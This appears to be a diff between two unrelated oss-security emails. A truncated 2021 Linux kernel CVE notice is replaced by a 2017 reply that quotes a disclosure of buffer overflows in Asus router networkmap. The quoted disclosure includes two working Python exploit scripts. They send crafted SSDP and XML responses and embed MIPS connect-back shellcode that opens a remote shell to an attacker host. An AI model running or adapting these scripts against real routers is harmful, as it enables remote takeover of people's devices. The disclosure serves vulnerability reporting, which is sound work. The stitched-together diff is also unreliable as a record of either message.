@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1559" "Tuesday" "7" "September" "2021" "14:09:52" "+0530" "Rohit Keshri" "rkeshri@redhat.com" nil "46" "[oss-security] CVE-2021-3715 Linux kernel: use-after-free in route4_change() in net/sched/cls_route.c" nil nil nil "9" nil nil (number mark "U       rkeshri@redh Sep  7   46/1559  " thread-indent "\"[oss-security] CVE-2021-3715 Linux kernel: use-after-free in route4_change() in net/sched/cls_route.c\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-3715 Linux kernel: use-after-free in route4_change() in net/sched/cls_route.c" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["21417" "Thursday" "13" "July" "2017" "11:39:16" "-0700" "Zach W" "kestrel@trylinux.us" "<6aa996f9-6878-aa47-ce9b-fccac3258fca@trylinux.us>" "594" "Re: [oss-security] Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap" "^Date:" nil nil "7" "2017071318:39:16" "[oss-security] Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap" (number mark "        kestrel@tryl Jul 13  594/21417 " thread-indent "\"Re: [oss-security] Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap\"\n") "<tencent_604D7B6374A98B9E75161D4B@qq.com>" ("<tencent_604D7B6374A98B9E75161D4B@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 3422 invoked by uid 550); 7 Sep 2021 10:07:02 -0000
+Received: (qmail 13977 invoked by uid 550); 13 Jul 2017 18:58:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,91 +11,615 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21541 invoked from network); 7 Sep 2021 08:40:19 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1631004007;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type;
-	bh=1D8H/0XSmYMyUymvGI5cqmEwiKIWfDFQ/1+oQofYDR8=;
-	b=EW2NqYZ7vMaz95QOJxEUb6my0DNMEmxhjtjBpbso2uGaTPK44eHLsWN5XBzVMsxaQG7xYn
-	zM/JRYQFXZx5FuMCdgosub/zzO5FrXxR/68Nyq6tcpWoLjOUWUdmKFCLKeRgGiTJy7+m/k
-	jlYmJoh3pkeW0Ynkmnl372omvbVogTw=
-X-MC-Unique: 7RPhdO5PPZ27hFSBCl1FjQ-1
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=1D8H/0XSmYMyUymvGI5cqmEwiKIWfDFQ/1+oQofYDR8=;
-        b=JDwC0ysLJTCZEXHMq4QGlf+p5ur7WL2Yh2obBf9Ij5Qlbv0byW5fT0qgi+D/GreOFX
-         JO91ZvCkX4CCYs52kDyeBeaoQBXMVskTOKe+eOkJd7Ia6SL5SA6vSYVR2FuifjBTmed5
-         4pssX9R8jmThfZoTeHFYTWef+sb2kE4MMYyo8/IF4PUT4KWZJhRrDlJ5fm5ShVXmhz2c
-         TLPkg5XI3ZrqvdbUoOjNhalv/pkWcDsgq34pPLawyN+TIFfT2qZHJkUB2fe4GmjcAuhs
-         JorlS6TkJNa0QAdnKkbjK67BjHo2Tgn1xb0W5f5VR7rhO12KjcNnyLfGMm67pWo2G8DR
-         Boqg==
-X-Gm-Message-State: AOAM531oQDKTrf+7TES1878uMapF1IoSScBu76ZxJKO1guUgmzswaEJ4
-	1m/SoKh1cjOu1IKAwnrj1Mccp6uelMVXkfTy6Ej07xZfY9hqHpLkU9AuJT91PEArx5vOFemjwJT
-	MIyzWk+kRHbm7nEdDNBAI3bByQHMC6S/iPXCuHgJCceBK
-X-Received: by 2002:a05:6512:220a:: with SMTP id h10mr11951325lfu.623.1631004003206;
-        Tue, 07 Sep 2021 01:40:03 -0700 (PDT)
-X-Google-Smtp-Source: ABdhPJyZg0IigiNgZwlmkuAPqnhye+2GaGnBdREqpn19ga4HCfSo9tQPwyAT/Ljv1bh5xF6vLyDscuEa0hpRIsfj9QY=
-X-Received: by 2002:a05:6512:220a:: with SMTP id h10mr11951313lfu.623.1631004002910;
- Tue, 07 Sep 2021 01:40:02 -0700 (PDT)
+Received: (qmail 3638 invoked from network); 13 Jul 2017 18:39:28 -0000
+References: <tencent_604D7B6374A98B9E75161D4B@qq.com>
+Message-ID: <6aa996f9-6878-aa47-ce9b-fccac3258fca@trylinux.us>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0)
+ Gecko/20100101 Thunderbird/52.2.1
 MIME-Version: 1.0
-From: Rohit Keshri <rkeshri@redhat.com>
-Date: Tue, 7 Sep 2021 14:09:52 +0530
-Message-ID: <CAKx+4-qZVEvOx+zD1R0r2UzNpT8eLUe+sTp78KJHjaEun7BVPA@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Authentication-Results: relay.mimecast.com;
-	auth=pass smtp.auth=CUSA124A263 smtp.mailfrom=rkeshri@redhat.com
-X-Mimecast-Spam-Score: 0
-X-Mimecast-Originator: redhat.com
-Content-Type: multipart/alternative; boundary="000000000000389a3005cb63b667"
-Subject: [oss-security] CVE-2021-3715 Linux kernel: use-after-free in
- route4_change() in net/sched/cls_route.c
+In-Reply-To: <tencent_604D7B6374A98B9E75161D4B@qq.com>
+Content-Type: multipart/alternative;
+ boundary="------------94B1C527BAF74BFA672B3E78"
+Content-Language: en-US
+Date: Thu, 13 Jul 2017 11:39:16 -0700
+From: Zach W <kestrel@trylinux.us>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Asus wireless routers Global buffer overflow and
+ Stack buffer overflow in networkmap
+To: oss-security@lists.openwall.com, =?UTF-8?B?6YCi5Z2C5rKz5rKz44CB44CB?=
+ <598930392@qq.com>
 
---000000000000389a3005cb63b667
-Content-Type: text/plain; charset="UTF-8"
+--------------94B1C527BAF74BFA672B3E78
+Content-Type: text/plain; charset=gb18030
+Content-Transfer-Encoding: 8bit
 
-Hello Team,
+Is this different from CVE-2017-6548?
 
-A flaw was found in the "Routing decision" classifier in the Linux kernel's
-Traffic Control networking subsystem in the way it handled changing of
-classification filters, leading to a use-after-free condition. This flaw
-allows unprivileged local users to escalate their privileges on the system.
-The highest threat from this vulnerability is confidentiality, integrity,
-as well as system availability.
+Zach W.
 
-This issue was fixed in the upstream Kernel 5.10 onward with ef299cc3fa1a9
-~~~
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ef299cc3fa1a9e1288665a9fdc8bff55629fd359
-~~~
 
-This problem is considered a security threat because unprivileged
-user/network namespaces can escalate privileges on the system.
+On 7/12/17 12:52 AM, ·êÛàºÓºÓ¡¢¡¢ wrote:
+> =============================================================
+>                                                Global buffer overflow
+> =============================================================
+>
+> [Vulnerability]:
+> Global buffer overflow in networkmap
+>
+>
+> ------------------------------------------
+> [Exploitation]:
+> Can write data at any address in heap
+>
+>
+> ------------------------------------------
+> [Vendor of Product]:
+> Asus wireless router
+>
+>
+> ------------------------------------------
+> [Affected Products and firmware version]:
+> Asuswrt-Merlin ,all the firmware and the latest firmware is 380.66_6
+> RT-AC5300 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT_AC1900P ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC68U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC68P 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC88U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC66U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC66U_B1 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC58U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7485
+> RT-AC56U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC55U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-AC52U 	,all the firmware,and the latest firmware is 3.0.0.4.380.4180
+> RT-AC51U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N18U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-N66U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N56U 	,all the firmware,and the latest firmware is 3.0.0.4.378.7177
+> RT-AC3200 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC3100 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT_AC1200GU ,all the firmware,and the latest firmware is 3.0.0.4.380.5577
+> RT_AC1200G ,all the firmware,and the latest firmware is 3.0.0.4.380.3167
+> RT-AC1200 ,all the firmware,and the latest firmware is 3.0.0.4.380.9880
+> RT-AC53 	,all the firmware,and the latest firmware is 3.0.0.4.380.9883
+> RT-N12HP 	,all the firmware,and the latest firmware is 3.0.0.4.380.2943
+> RT-N12HP_B1 ,all the firmware,and the latest firmware is 3.0.0.4.380.3479
+> RT-N12D1 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N12+ 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT_N12+_PRO ,all the firmware,and the latest firmware is 3.0.0.4.380.9880
+> RT-N16 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N300 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+>
+>
+> ------------------------------------------
+> [Attack Type]:
+> Remote
+>
+>
+> ------------------------------------------
+> [Can Cause Denial of Service?]:
+> yes
+>
+>
+> ------------------------------------------
+> [Reference]:
+> https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/function.c#L903-L1032
+> http://asuswrt.lostrealm.ca/
+> https://www.asus.com/Networking/RTN12HP_B1/HelpDesk_Download/  (chose the others can download the firmware sourcecode)
+> https://www.asus.com/Networking/Wireless-Routers-Products/
+>
+>
+> ------------------------------------------
+> [Discoverer]:
+> Tianfeng Guan, pkav of Sichuan Silent Information Technology Company Ltd, http://www.silence.com.cn/
+>
+>
+> ------------------------------------------
+> [Affected components]:
+> Affected executable application: networkmap
+> Affected source code file: \release\src\router\networkmap\function.c
+> Affected function: store_description(char *msg)
+>
+>
+> ------------------------------------------
+> [Vulnerability description]:
+> When the function process_device_repsonse of networkmap is parsing the 
+> SSDP answer from a device and the SSDP answer has indicated the location like:
+> 	HTTP/1.1 200 OK
+> 	Location:HTTP://host:port/path
+> If the "HTTP://host:port/path" is valid, the networkmap will get the 
+> device descirption xml by accessing "HTTP://host:port/path",and it will use 
+> the function store_description to store the device descirption information 
+> to global sturct device_info.
+> In the function store_description,there's no limit to the variable s_num,
+> so that it can cause the global sturct device_info overflow when copy the
+> data from tmp to description.service[s_num].url .
+>
+>
+> ------------------------------------------
+> [Vulnerability details]:
+> In the \release\src\router\networkmap\function.c,
+> It define the global struct device_info description and the function store_description:
+> ...
+> struct device_info description;
+> ...
+> void store_description(char *msg)
+> {
+> 		...
+>         int s_num = 0;
+> 		...
+> 		while( p!= NULL && p < body)
+>         {
+> 		...
+> 		switch(type)
+> 		{
+> 		...
+>         case 7:
+>             strlcpy(description.service[s_num].url, tmp, sizeof(description.service[s_num].url));
+>             NMP_DEBUG_F("service %d url = %s\n", s_num, tmp);
+>             s_num++;
+>             break;
+>         }
+>         }
+>         ...
+> }
+>
+>
+> You can see that the s_num variable is incremented in case 7,
+> But in the while( p!= NULL && p < body),it never check the s_num variable.
+> And in the \release\src\router\networkmap\networkmap.h,it define the struct device_info:
+> ...
+> #define LINE_SIZE               200
+> #define SERVICE_NUM             10
+> struct service
+> {
+>         char name[LINE_SIZE];
+>         char url[LINE_SIZE];
+> };
+> struct device_info
+> {
+>         char friendlyname[LINE_SIZE];
+>         char manufacturer[LINE_SIZE];
+>         char description[LINE_SIZE];
+>         char modelname[LINE_SIZE];
+>         char modelnumber[LINE_SIZE];
+>         char presentation[LINE_SIZE];
+>         struct service service[SERVICE_NUM];
+>         int service_num;
+> };
+>
+>
+> Because SERVICE_NUM = 10,so,in the case 7 which in the function store_description, 
+> when the s_num variable has be incremented and the s_num > 10,
+> the data copy to struct device_info description.service[s_num].url will overflow.
+>
+>
+> ------------------------------------------
+> [Exploitation details]:
+> When the networkmap get the device descirption xml by accessing "HTTP://host:port/path",
+> we can respond a device descirption xml like:
+> <?xml><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL>shellcode<></root>
+> the shellcode will be written to the memory that out of the global struct device_info description.
+>
+>
+> And then,because the memory maps for networkmap is:
+> admin@RT-N12HP_B1:/# cat /proc/$(pidof networkmap)/maps
+> 00400000-0040a000 r-xp 00000000 1f:02 104        /usr/sbin/networkmap
+> 0041a000-0041b000 rw-p 0000a000 1f:02 104        /usr/sbin/networkmap
+> 0041b000-00420000 rwxp 0041b000 00:00 0          [heap]
+> 2aaa8000-2aaae000 r-xp 00000000 1f:02 733        /lib/ld-uClibc.so.0
+> 2aaae000-2aaaf000 rw-p 2aaae000 00:00 0 
+> 2aab0000-2aab6000 rw-s 00000000 00:07 0          /SYSV000003e9 (deleted)
+> 2aab6000-2aaba000 rw-s 00000000 00:07 32769      /SYSV000003ea (deleted)
+> 2aabd000-2aabe000 r--p 00005000 1f:02 733        /lib/ld-uClibc.so.0
+> 2aabe000-2aabf000 rw-p 00006000 1f:02 733        /lib/ld-uClibc.so.0
+> 2aabf000-2aaeb000 r-xp 00000000 1f:02 164        /usr/lib/libshared.so
+> 2aaeb000-2aafa000 ---p 2aaeb000 00:00 0 
+> 2aafa000-2aafe000 rw-p 0002b000 1f:02 164        /usr/lib/libshared.so
+> 2aafe000-2ab0f000 rw-p 2aafe000 00:00 0 
+> 2ab0f000-2ab11000 r-xp 00000000 1f:02 235        /usr/lib/libnvram.so
+> 2ab11000-2ab21000 ---p 2ab11000 00:00 0 
+> 2ab21000-2ab22000 rw-p 00002000 1f:02 235        /usr/lib/libnvram.so
+> 2ab22000-2ab30000 r-xp 00000000 1f:02 732        /lib/libgcc_s.so.1
+> 2ab30000-2ab40000 ---p 2ab30000 00:00 0 
+> 2ab40000-2ab41000 rw-p 0000e000 1f:02 732        /lib/libgcc_s.so.1
+> 2ab41000-2ab79000 r-xp 00000000 1f:02 728        /lib/libc.so.0
+> 2ab79000-2ab89000 ---p 2ab79000 00:00 0 
+> 2ab89000-2ab8a000 rw-p 00038000 1f:02 728        /lib/libc.so.0
+> 2ab8a000-2ab8e000 rw-p 2ab8a000 00:00 0 
+> 2ab8e000-2ab96000 r--s 00000000 00:0b 297        /dev/nvram
+> 7fc20000-7fc35000 rwxp 7fc20000 00:00 0          [stack]
+> 7fff7000-7fff8000 r-xp 7fff7000 00:00 0          [vdso]
+>
+>
+> Both the Program address and the Heap address are not randomized and Continuous.
+> So when the global struct device_info overflow ,the shellcode could be write to 
+> the heap ,and the shellcode address in the heap is fixed and Controllable.
+>
+>
+> ------------------------------------------
+> [exp.py]:
+> # Tested product and firmware version:
+> # RT-N12HP_B1 (3.0.0.4.380.3479)
+>
+>
+> # coding=utf-8
+>
+>
+> ROUTER_IP = '192.168.2.1'	    #asus wireless router ip
+> IP = '192.168.2.31'		        #attacker ip
+> INTERACE = 'eth0'			    #attacker host network interface
+> CONNECTBACK_IP = '192.168.2.31' #the host ip use for connectback shell shellcode
+> 								#the default connectback port is 30583
+>                                 
+> import time
+> import socket
+> import sys
+> import os
+> import threading
+> import socketserver
+>
+>
+> sc = '<?xml><SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += '<>'
+> sc += '<SCPDURL>'
+> sc += b'\xff\xff\x04\x28'
+> sc += b'\xbb\x0f\x02\x24'
+> sc += b'\x0c\x01\x01\x01'
+> sc += b'\xfa\xff\x0f\x24'
+> sc += b'\x27\x78\xe0\x01'
+> sc += b'\xfd\xff\xe4\x21'
+> sc += b'\xfd\xff\xe5\x21'
+> sc += b'\xff\xff\x06\x28'
+> sc += b'\x57\x10\x02\x24'
+> sc += b'\x0c\x01\x01\x01'
+> sc += b'\xff\xff\xa2\xaf'
+> sc += b'\xff\xff\xa4\x8f'
+> sc += b'\xfd\xff\x11\x24'
+> sc += b'\x27\x88\x20\x02'
+> sc += b'\xe2\xff\xb1\xa7'
+> sc += b'\x77\x77\x0e\x24'
+> sc += b'\xe4\xff\xae\xa7'
+> sc += socket.inet_aton(CONNECTBACK_IP)[0] + socket.inet_aton(CONNECTBACK_IP)[1] + b'\x0e\x34'
+> sc += b'\xe6\xff\xae\xa7'
+> sc += socket.inet_aton(CONNECTBACK_IP)[2] + socket.inet_aton(CONNECTBACK_IP)[3] + b'\x0e\x24'
+> sc += b'\xe8\xff\xae\xa7'
+> sc += b'\xe2\xff\xa5\x27'
+> sc += b'\xef\xff\x0c\x24'
+> sc += b'\x27\x30\x80\x01'
+> sc += b'\x4a\x10\x02\x24'
+> sc += b'\x0c\x01\x01\x01'
+> sc += b'\x21\x28\x20\x02'
+> sc += b'\xdf\x0f\x02\x24'
+> sc += b'\x0c\x01\x01\x01'
+> sc += b'\xff\xff\x10\x24'
+> sc += b'\xff\xff\x31\x22'
+> sc += b'\xfa\xff\x30\x16'
+> sc += b'\xff\xff\x06\x28'
+> sc += b'\x2f\x2f\x0f\x24'
+> sc += b'\xec\xff\xaf\xa7'
+> sc += b'\x62\x69\x0f\x24'
+> sc += b'\xee\xff\xaf\xa7'
+> sc += b'\x6e\x2f\x0e\x24'
+> sc += b'\xf0\xff\xae\xa7'
+> sc += b'\x73\x68\x0e\x24'
+> sc += b'\xf2\xff\xae\xa7'
+> sc += b'\xf4\xff\xa0\xaf'
+> sc += b'\xec\xff\xa4\x27'
+> sc += b'\xf8\xff\xa4\xaf'
+> sc += b'\xfc\xff\xa0\xaf'
+> sc += b'\xf8\xff\xa5\x27'
+> sc += b'\xab\x0f\x02\x24'
+> sc += b'\x0c\x01\x01\x01'
+> sc += '<></root>'
+>
+>
+> def mac():
+>     os.system('macchanger -A {}'.format(INTERACE))
+>
+>
+> os.system('ifconfig {} down; ifconfig {} {} up; route add default gw {};'.format(INTERACE, INTERACE, IP, ROUTER_IP))
+>
+>
+> class ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler):
+>
+>
+>     def handle(self):
+>         print('[-] got shellcode request')
+>         self.request.recv(1024)
+>         print("[-] sending shellcode")
+>         self.request.send(sc)
+>
+>
+> class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+>     pass
+>
+>
+> socketserver.TCPServer.allow_reuse_address = True
+> server = ThreadedHTTPServer(('0.0.0.0', 1337), ThreadedHTTPRequestHandler)
+> t = threading.Thread(target=server.serve_forever)
+> t.start()
+>
+>
+> print("[-] Please opens a new terminal and use ping ROUTER_IP to Speed up SSDP network interaction")
+>
+>
+> addrinfo = socket.getaddrinfo('239.255.255.250', None)[0]
+> s = socket.socket(addrinfo[0], socket.SOCK_DGRAM)
+> s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+> s.bind(('239.255.255.250', 1900))
+> s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(addrinfo[4][0]) + socket.inet_aton('0.0.0.0'))
+>
+>
+> mac()
+> times = 0
+> state = 'Overflow'
+>
+>
+> while True:
+>     data, sender = s.recvfrom(1500)
+>     if sender[0] == ROUTER_IP and sender[1] == 1008:
+>         print("[-] received SSDP M-SEARCH Package")
+>
+>
+>         data = {}
+>         data['Overflow'] = b'HTTP/1.1 200 OK\r\nLocation:HTTP://' + IP.encode() + b':1337/A\r\n\r\n'
+>
+>
+>         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+>         sock.sendto(data[state], sender)
+>
+>
+>         if state == 'Overflow':
+>             print("[-] Send the GetXmlRequest to router")
+>             time.sleep(20)
+>             os._exit(0)
+>
+>
+>
+> =============================================================
+>                                                Stack buffer overflow
+> =============================================================
+>
+>
+> [Vulnerability]:
+> Stack buffer overflow in networkmap
+>
+>
+> ------------------------------------------
+> [Exploitation]:
+> Can control the $pc.
+> Together with the above Global buffer overflow vulnerability,
+> can remote code execution and then get a connectback shell. 
+>
+>
+> ------------------------------------------
+> [Vendor of Product]:
+> Asus wireless router
+>
+>
+> ------------------------------------------
+> [Affected Products and firmware version]:
+> Asuswrt-Merlin ,all the firmware and the latest firmware is 380.66_6
+> RT-AC5300 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT_AC1900P ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC68U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC68P 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC88U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC66U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC66U_B1 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC58U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7485
+> RT-AC56U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC55U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-AC52U 	,all the firmware,and the latest firmware is 3.0.0.4.380.4180
+> RT-AC51U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N18U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-N66U 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N56U 	,all the firmware,and the latest firmware is 3.0.0.4.378.7177
+> RT-AC3200 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT-AC3100 ,all the firmware,and the latest firmware is 3.0.0.4.380.7743
+> RT_AC1200GU ,all the firmware,and the latest firmware is 3.0.0.4.380.5577
+> RT_AC1200G ,all the firmware,and the latest firmware is 3.0.0.4.380.3167
+> RT-AC1200 ,all the firmware,and the latest firmware is 3.0.0.4.380.9880
+> RT-AC53 	,all the firmware,and the latest firmware is 3.0.0.4.380.9883
+> RT-N12HP 	,all the firmware,and the latest firmware is 3.0.0.4.380.2943
+> RT-N12HP_B1 ,all the firmware,and the latest firmware is 3.0.0.4.380.3479
+> RT-N12D1 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N12+ 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT_N12+_PRO ,all the firmware,and the latest firmware is 3.0.0.4.380.9880
+> RT-N16 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+> RT-N300 	,all the firmware,and the latest firmware is 3.0.0.4.380.7378
+>
+>
+> ------------------------------------------
+> [Attack Type]:
+> Remote
+>
+>
+> ------------------------------------------
+> [Can Cause Denial of Service?]:
+> yes
+>
+>
+> ------------------------------------------
+> [Reference]:
+> https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/function.c#L903-L1032
+> http://asuswrt.lostrealm.ca/
+> https://www.asus.com/Networking/RTN12HP_B1/HelpDesk_Download/  (chose the others can download the firmware sourcecode)
+> https://www.asus.com/Networking/Wireless-Routers-Products/
+>
+>
+> ------------------------------------------
+> [Discoverer]:
+> Tianfeng Guan, pkav of Sichuan Silent Information Technology Company Ltd, http://www.silence.com.cn/
+>
+>
+> ------------------------------------------
+> [Affected components]:
+> Affected executable application: networkmap
+> Affected source code file: \release\src\router\networkmap\function.c
+> Affected function: store_description(char *msg)
+>
+>
+> ------------------------------------------
+> [Vulnerability details]:
+> When the function process_device_repsonse of networkmap is parsing the SSDP answer 
+> from a device and the SSDP answer has indicated the location like:
+> 	HTTP/1.1 200 OK
+> 	Location:HTTP://host:port/path
+> If the "HTTP://host:port/path" is valid, the networkmap will get the device descirption 
+> xml by accessing "HTTP://host:port/path",and it will use the function store_description 
+> to store the device descirption information to global sturct device_info.
+>
+>
+> In the switch case 6 which in the function store_description:
+>
+>
+>     case 6: // tmp="urn:schemas-upnp-org:service:serviceType:v"
+> 		mxend = tmp;
+> 		i = 0; j = 0;
+> 		while(i != 4)
+> 		{
+> 			if(i == 3)
+> 			tmp[j++] = *mxend;
+> 			if(*mxend == ':')
+> 			i++;
+> 			mxend++;
+> 		}
+> 		tmp[j-1] = '\0';
+> 		strlcpy(description.service[s_num].name, tmp, sizeof(description.service[s_num].name));
+> 		NMP_DEBUG_F("service %d name = %s\n", s_num, tmp);
+> 		break;
+> 						
+> if it couldn't found the fourth ':' in the stack, the stack buffer tmp will be overflow, 
+> and this stack-based overflow can be used to gain control over networkmap¡¯s control flow 
+> by overwriting the saved $ra stored on the stack.
+>
+>
+> ------------------------------------------
+> [Exploitation details]:
+> when answer the SSDP request, we can send the SSDP answer message like:
+> 	'HTTP/1.1 200 OK\r\nLocation:HTTP://192.168.2.31:1337/' + 'B'*231 + b'\x41\x41\x41:' + '\r\n\r\n'
+> And When the networkmap get the device descirption xml by accessing "HTTP://192.168.2.31:1337/",
+> we can respond a device descirption xml like:
+> 	<?xml><serviceType>AAAA<></root>
+> And then, after the code in case 6,the stack buffer tmp will be overflow,and the 
+> data start from stack buffer tmp will become 'B'*231 + b'\x41\x41\x41',
+> and it lead to the $ra and $pc being set to 0x00414141.
+>
+>
+> Now we can control the $pc by overwriting the saved $ra stored on the stack. 
+> For further exploitation,to get a ConnectBack shell,we can use the "Write data
+> at any address in heap" vulnerability which also in function store_description,
+> to write the ConnectBack shell shellcode on a fixed heap address,and then we 
+> can use this Code Execution vulnerability to let $pc be set as the ConnectBack shell shellcode address.
+>
+>
+> ------------------------------------------
+> [exp.py]:
+> # Tested product and firmware version:
+> # RT-N12HP_B1 (3.0.0.4.380.3479)
+>
+>
+> # coding=utf-8
+>
+>
+> ROUTER_IP = '192.168.2.1'	    #asus wireless router ip
+> IP = '192.168.2.31'		        #attacker ip
+> INTERACE = 'eth0'			    #attacker host network interface
+>
+>
+> import time
+> import socket
+> import sys
+> import os
+> import threading
+> import socketserver
+>
+>
+> sc = '<?xml>'
+> sc += '<serviceType>'
+> sc += b'AAAA' * 49
+> sc += 'AA<></root>'
+>
+>
+> def mac():
+>     os.system('macchanger -A {}'.format(INTERACE))
+>
+>
+> os.system('ifconfig {} down; ifconfig {} {} up; route add default gw {};'.format(INTERACE, INTERACE, IP, ROUTER_IP))
+>
+>
+> class ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler):
+>
+>
+>     def handle(self):
+>         print('[-] got xml request')
+>         self.request.recv(1024)
+>         print("[-] sending xml")
+>         self.request.send(sc)
+>
+>
+> class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+>     pass
+>
+>
+> socketserver.TCPServer.allow_reuse_address = True
+> server = ThreadedHTTPServer(('0.0.0.0', 1337), ThreadedHTTPRequestHandler)
+> t = threading.Thread(target=server.serve_forever)
+> t.start()
+>
+>
+> print("[-] Please opens a new terminal and use ping ROUTER_IP to Speed up SSDP network interaction")
+>
+>
+> addrinfo = socket.getaddrinfo('239.255.255.250', None)[0]
+> s = socket.socket(addrinfo[0], socket.SOCK_DGRAM)
+> s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+> s.bind(('239.255.255.250', 1900))
+> s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(addrinfo[4][0]) + socket.inet_aton('0.0.0.0'))
+>
+>
+> mac()
+> times = 0
+> state = 'Overflow'
+>
+>
+> while True:
+>     data, sender = s.recvfrom(1500)
+>     if sender[0] == ROUTER_IP and sender[1] == 1008:
+>         print("[-] received SSDP M-SEARCH Package")
+>
+>
+>         data = {}
+>         data['Overflow'] = b'HTTP/1.1 200 OK\r\nLocation:HTTP://' + IP.encode() + b':1337/' + 'B'*231 + b'\xe0\xbb\x41:' + '\r\n\r\n'
+>
+>
+>         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+>         sock.sendto(data[state], sender)
+>
+>
+>         if state == 'Overflow':
+>             print("[-] Send the GetXmlRequest to router")
+>             time.sleep(20)
+>             os._exit(0)
 
-'CVE-2021-3715' was assigned by Red Hat.
 
-* acks (Zhenpeng Lin)
-
-* Description from the reporter:
-
-"Originally the bug was found by Syzkaller in
-https://syzkaller.appspot.com/bug?id=6a039858238a38cbc7f372607fc5d49f4469cf2c
-.
-It shows a warning bug effect that is not exploitable, seemingly.
-However, the bug can be turned into a use-after-free bug and eventually
